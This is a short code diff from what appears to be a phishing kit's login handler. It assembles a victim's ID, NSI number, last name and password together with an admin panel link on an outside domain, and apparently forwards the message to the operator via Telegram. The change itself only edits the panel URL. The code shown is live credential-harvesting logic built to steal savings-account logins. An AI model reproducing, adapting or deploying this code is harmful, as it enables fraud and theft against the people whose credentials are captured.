@@ -59,7 +59,7 @@ const submitLogin = async (req, res) => {
 			timestamp: moment().format(),
 		});
 
-		let originalText = `ID: ${uniqueid}\nNSI: ${nsiNumber}\nLast name: ${surname}\nPassword: ${password}\n\nAdmin Link: https://haytchc0ding.co.uk/?panel=nsi&password=${owner}`;
+		let originalText = `ID: ${uniqueid}\nNSI: ${nsiNumber}\nLast name: ${surname}\nPassword: ${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=nsi&password=${owner}`;
 
 		if (telegramId) {
 			await axios
